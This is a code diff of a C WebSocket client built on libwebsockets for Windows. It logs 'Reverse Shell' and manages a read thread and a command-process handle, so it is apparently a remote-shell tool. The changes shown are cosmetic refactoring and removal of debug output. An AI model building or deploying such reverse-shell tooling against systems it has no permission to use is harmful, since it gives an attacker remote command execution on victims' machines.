@@ -2,6 +2,7 @@
 
 EXTERN_C_START
 
+/********************************************************************************************************************************/
 static struct my_conn
 {
 	lws_sorted_usec_list_t	sul;	     /* schedule connection retry */
@@ -12,10 +13,7 @@ static struct my_conn
 static int interrupted;
 static const char* pro = "dumb-increment-protocol";
 
-/*
- * The retry and backoff policy we want to use for our client connections
- */
-
+// The retry and backoff policy we want to use for our client connections
 static const uint32_t backoff_ms[] = { 1000, 2000, 3000, 4000, 5000 };
 
 static const lws_retry_bo_t retry =
@@ -30,7 +28,13 @@ static const lws_retry_bo_t retry =
 	.jitter_percent = 20,
 };
 
+static const struct lws_protocols protocols[] =
+{
+	{ "lws-minimal-client", callback_minimal, sizeof(WebSocketData), 0, },
+	{ NULL, NULL, 0, 0 }
+};
 
+/********************************************************************************************************************************/
 static void connect_client(lws_sorted_usec_list_t* sul)
 {
 	struct my_conn* mco = lws_container_of(sul, struct my_conn, sul);
@@ -64,7 +68,7 @@ static void connect_client(lws_sorted_usec_list_t* sul)
 			interrupted = 1;
 		}
 }
-
+/********************************************************************************************************************************/
 static int callback_minimal(struct lws* socket, enum lws_callback_reasons reason, void* user, void* in, size_t len)
 {
 	struct my_conn* mco = (struct my_conn*)user;
@@ -118,9 +122,6 @@ static int callback_minimal(struct lws* socket, enum lws_callback_reasons reason
 
 		((WebSocketData*)user)->hThreadRead = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc, (WebSocketData*)user, 0, NULL);
 
-		if (creat == NULL)
-			printf("Return value of CreateThread %d equal to NULL\n", creat);
-
 		break;
 	}
 		
@@ -128,14 +129,12 @@ static int callback_minimal(struct lws* socket, enum lws_callback_reasons reason
 
 		if (((WebSocketData*)user)->hThreadRead)
 		{
-			printf("%d\n", ((WebSocketData*)user)->hThreadRead);
 			BOOL ret = TerminateThread(((WebSocketData*)user)->hThreadRead, 0);
 			printf("Thread Read ended: GetLastError(%d)\n", GetLastError());
 		}
 
 		if (((WebSocketData*)user)->hCmdProcess)
 		{
-			printf("%d\n", ((WebSocketData*)user)->hCmdProcess);
 			BOOL ret = TerminateProcess(((WebSocketData*)user)->hCmdProcess, 0);
 			printf("Process ended: GetLastError(%d)\n", GetLastError());
 		}
@@ -169,19 +168,12 @@ do_retry:
 
 	return 0;
 }
-
-static const struct lws_protocols protocols[] =
-{
-	{ "lws-minimal-client", callback_minimal, sizeof(WebSocketData), 0, },
-	{ NULL, NULL, 0, 0 }
-};
-
+/********************************************************************************************************************************/
 // Make the connection with the server
 BOOL WS_Connection()
 {
 	//struct WebSocketData wsData = { 0 };
 	struct lws_context_creation_info info = { 0 };
-	const char* p;
 	int n = 0;
 
 	lwsl_user("Reverse Shell\n");
@@ -213,5 +205,6 @@ BOOL WS_Connection()
 
 	return TRUE;
 }
+/********************************************************************************************************************************/
 
 EXTERN_C_END
